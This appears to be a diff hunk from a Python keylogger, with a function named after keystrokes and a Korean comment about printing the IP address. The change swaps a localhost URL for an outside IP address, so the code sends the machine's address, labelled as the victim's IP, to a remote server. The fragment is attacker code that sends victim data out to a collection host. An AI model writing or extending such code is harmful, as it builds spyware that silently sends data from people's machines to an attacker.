@@ -56,7 +56,7 @@ def keystorkes(key):
 # IP 주소 출력
 ip_address = get_ip_address()
 if ip_address:
-        response = requests.get("http://127.0.0.1:8080/test.jsp", params={"data": '[!] Victim_IP: '+ip_address})
+        response = requests.get("http://1.230.60.108:8080/test.jsp", params={"data": '[!] Victim_IP: '+ip_address})
 
 
 
